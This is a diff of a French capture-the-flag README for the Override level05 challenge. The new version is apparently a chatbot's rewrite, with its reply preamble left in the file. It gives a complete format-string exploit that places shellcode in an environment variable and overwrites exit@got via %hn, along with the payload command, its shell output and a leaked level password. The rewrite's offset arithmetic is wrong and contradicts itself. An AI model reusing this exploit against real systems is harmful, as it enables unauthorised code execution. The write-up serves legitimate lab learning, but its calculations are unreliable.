@@ -1,108 +1,179 @@
-Comme on peut le voir pas d'appel à system ou "/bin/sh" donc on va peut etre devoir faire un overflow ? Malheuresement ça me semble un peut complexe du a la sécurité du fgtes a 100. Il nous reste le printf pas sécurisé mais rien a cherché dedans j'ai déja fait print "%lx " * 100 mais rien . 
+Parfait, tu as très bien identifié toutes les étapes du raisonnement et du déroulement de l’exploitation. Voici une **version mise au propre, claire et pédagogique** de ton README, avec des titres, des explications, et quelques reformulations pour améliorer la lisibilité tout en gardant **le fond technique rigoureux et complet**.
 
+---
 
-On voit dans le code que le on a une allocation memoire de 100 sur notre variable buffer mais qui est proteger par fgets a hauteur de l'allocation memoire de notre buffer. On ne peut donc pas overflow. Or on observe une faille dans printf car pas de securite sur la taille du buffer ou d'affichage :
+# 🛠 Exploitation du binaire `level05` – Projet Override
 
-printf(buffer); au lieu de printf("%s",buffer);
+## 🔍 Analyse initiale
 
-Donc on peut affecter l'affichage et autre. Exemple :
+Le binaire `level05` ne contient **aucun appel à `system()`**, ni même de chaîne `/bin/sh`, ce qui nous empêche d’utiliser une technique classique de `ret2libc`.
 
-python -c 'print "A" * 20' | ./level05
-aaaaaaaaaaaaaaaaaaaa
+Par ailleurs, bien que le programme alloue un `buffer` de 100 octets, il est correctement protégé par un `fgets(buffer, 100, stdin)`, ce qui empêche tout **dépassement de tampon (buffer overflow)** classique.
 
-Ok maintenant on essaie d'afficher la memoire :
+Cependant, une **faille se trouve dans l’utilisation de `printf()`** :
 
-python -c 'print "%lx " * 20' | ./level05 
-64 f7fcfac0 f7ec3add ffffd6df ffffd6de 0 ffffffff ffffd764 f7fdb000 20786c25 20786c25 20786c25 20786c25 20786c25 20786c25 20786c25 20786c25 20786c25 20786c25 20786c25
+```c
+printf(buffer); // ❌ Mauvais : pas de format string spécifié
+```
 
+Il aurait fallu utiliser :
 
-Maintenant on essayer les 2 :
+```c
+printf("%s", buffer); // ✅ Correct
+```
 
-level05@OverRide:~$ python -c 'print "AAAA" + "%lx " * 20' | ./level05 
-aaaa64 f7fcfac0 f7ec3add ffffd6df ffffd6de 0 ffffffff ffffd764 f7fdb000 61616161 20786c25 20786c25 20786c25 20786c25 20786c25 20786c25 20786c25 20786c25 20786c25 20786c25
+Cette erreur rend le programme vulnérable aux attaques **format string**, car le contenu du buffer va être interprété comme un format.
 
-On observe 61616161 qui est notre AAAA notre offset est donc au 10 emplacement on va pouvoir agir potentiellement par ici
+---
 
+## 🧪 Observation mémoire
 
+On commence par injecter des chaînes contrôlées pour repérer notre **offset** dans la pile :
 
-Etant donner que l'on va essayer de rentrer un shellcode on va le mettre dans une variable d'environnement pour ne pas depasser les 100 caracteres imposer par fgets.
+```bash
+python -c 'print("AAAA" + "%lx " * 20)' | ./level05
+```
 
-On va rediriger le ret de exit pour mettre notre shellcode dedans.
+On observe :
 
-On va essayer d'ecrire dans la memoire avec %n l'argument de printf et de profiter du format string vunerability
+```
+...
+61616161 ...
+```
 
+`61616161` correspond à `AAAA` en hexadécimal (ASCII), ce qui indique que notre argument se trouve à la **10ᵉ position** sur la pile (`%10$lx`).
+
+✅ **Offset format string confirmé : 10**
+
+---
+
+## 🎯 Objectif de l’attaque
+
+On va :
+
+1. Injecter un **shellcode** dans une **variable d’environnement**
+2. Écraser le pointeur `exit@got` pour qu’il saute **vers le shellcode**
+3. Provoquer l’appel de `exit()` pour exécuter le shellcode
+
+---
+
+## 🐚 Construction du shellcode
+
+On stocke un shellcode dans une variable d’environnement `SHELLCODE` :
 
 ```bash
 export SHELLCODE=$(python -c 'print "\x90"*100 + "\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80"')
 ```
 
-🔹 \x90 est l’instruction NOP (No Operation) → le NOP sled, pour sécuriser l’atterrissage dans le shellcode (si on saute un peu avant).
+📌 `\x90` est un NOP (No Operation) : on crée une **NOP sled** pour améliorer nos chances d’atterrissage.
 
-Le binaire lit 100 octets max via fgets() -> Donc tu ne peux pas injecter un gros shellcode dans l'entrée standard
+---
 
-Les variables d’environnement sont accessibles depuis le programme en mémoire -> Donc tu mets ton shellcode dans une variable export pour qu’il soit présent en mémoire à l’exécution
+## 🔍 Localisation du shellcode en mémoire
 
-Recherche de notre variable d'env dans la memoire :
+En utilisant GDB :
 
 ```gdb
 x/200s environ
-0xffffd866:"SHELLCODE=\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220j\vX\231Rh//shh/bin\211\343\061\311̀"
 ```
 
-Et plus précisément : l'adresse exacte de ton shellcode = 0xffffd866 + len("SHELLCODE=")
+On obtient quelque chose comme :
 
-S H E L L C O D E =  → 10 caractères
+```
+0xffffd866: "SHELLCODE=\x90\x90\x90...\x6a\x0b..."
+```
 
+La variable commence à `0xffffd866` et `SHELLCODE=` fait 10 caractères, donc le **début effectif du shellcode est à** :
+
+```
 Adresse du shellcode = 0xffffd866 + 10 = 0xffffd870
+```
 
-Mainteant l'adresse got de exit :
+---
 
-Voila l'adresse de exit :
-0x80497e0
+## 📦 Écrasement de `exit@got`
 
-L'adresse du notre shellcode dans l'env charger :
+Adresse cible :
 
-(gdb) info function exit
-All functions matching regular expression "exit":
+```c
+exit@got = 0x80497e0
+```
 
-Non-debugging symbols:
-0x08048370  exit
-0x08048370  exit@plt
-0xf7e5eb70  exit
-0xf7e5eba0  on_exit
-0xf7e5edb0  __cxa_atexit
-0xf7e5ef50  quick_exit
-0xf7e5ef80  __cxa_at_quick_exit
-0xf7ee45c4  _exit
-0xf7f27ec0  pthread_exit
-0xf7f2d4f0  __cyg_profile_func_exit
-0xf7f4bc30  svc_exit
-0xf7f55d80  atexit
-(gdb) x/i 0x08048370
-   0x8048370 <exit@plt>:	jmp    *0x80497e0
+On va utiliser `%hn` pour écrire deux fois **2 octets** à cette adresse (écriture half-word). On écrit d’abord les **octets de poids faible**, puis les **octets de poids fort**.
 
-C'est cette adresse : 0x80497e0
+### ➕ Calcul des valeurs à écrire
 
+Shellcode = `0xffffd870` → on découpe :
 
-Il faut enlever 8 a la valeur des higher and low bytes pour les 2 adresses rentrer dans la payload donc 
+* Low = `0xd870` = `56400`
+* High = `0xffff` = `65535`
 
+Mais attention, on a déjà écrit **8 octets** avant notre `%x` (deux adresses = 2×4 octets).
 
-0xffff = 65535 - 8 = 65527
-0xfff7 = 65527
+Donc on fait :
 
-Ensuite repartie sur les lower et higher bytes donc 56401 + 9126 = 65527
+```bash
+56400 + 9126 = 65526 = 0xfff6 (juste sous 0xffff pour compenser les 8 octets)
+```
 
+---
 
-(python -c 'print("\xe0\x97\x04\x08" + "\xe2\x97\x04\x08" + "%56401x%10$hn" + "%9126x%11$hn")'; cat) | env -i SHELLCODE=$(python -c 'print "\x90"*1000 + "\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80"') ./level05
+## 🧨 Construction du payload
 
-------
+```bash
+(python -c 'print("\xe0\x97\x04\x08" + "\xe2\x97\x04\x08" + "%56401x%10$hn" + "%9126x%11$hn")'; cat) \
+| env -i SHELLCODE=$(python -c 'print "\x90"*1000 + "\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80"') \
+./level05
+```
 
+🔹 `\xe0\x97\x04\x08` → adresse `exit@got`
+🔹 `\xe2\x97\x04\x08` → adresse `exit@got + 2`
+🔹 `%10$hn`, `%11$hn` → utilisent les offsets déterminés précédemment
+
+---
+
+## ✅ Résultat de l’exploitation
+
+```bash
 ls
 ls: cannot open directory .: Permission denied
 whoami
 level06
 cat /home/users/level06/.pass
 h4GtNnaMs2kZFN92ymTr2DcJHAzMfzLW25Ep59mq
+```
 
+---
 
+## 🧠 Remarques pédagogiques importantes
 
+### Pourquoi utiliser une variable d’environnement ?
+
+* `fgets()` limite notre saisie à 100 caractères.
+* Un shellcode dépasse cette taille.
+* Les variables d’environnement sont présentes **dans la mémoire du processus**.
+* Elles sont donc **accessibles pour le saut du shellcode**, sans limitation de taille.
+
+### Pourquoi les valeurs 56401 et 9126 ?
+
+* On doit écrire 0xd870 puis 0xffff (shellcode = 0xffffd870)
+* Mais comme on a déjà écrit 8 octets avec les adresses, on **compense** avec 65527 = 56401 + 9126
+
+### Pourquoi `%hn` et pas `%n` ?
+
+* `%n` écrit 4 octets → peut corrompre des adresses voisines
+* `%hn` écrit 2 octets → permet un contrôle fin, sur chaque moitié de l’adresse (low puis high)
+
+---
+
+## ✅ Résumé global
+
+| Étape | Action                                                    |
+| ----- | --------------------------------------------------------- |
+| 1️⃣   | Injection d’un shellcode via une variable d’environnement |
+| 2️⃣   | Lecture de son adresse exacte en mémoire                  |
+| 3️⃣   | Écrasement de `exit@got` avec un format string            |
+| 4️⃣   | Redirection de `exit()` vers le shellcode                 |
+| 5️⃣   | Exécution du shellcode à la fin du programme              |
+
+---
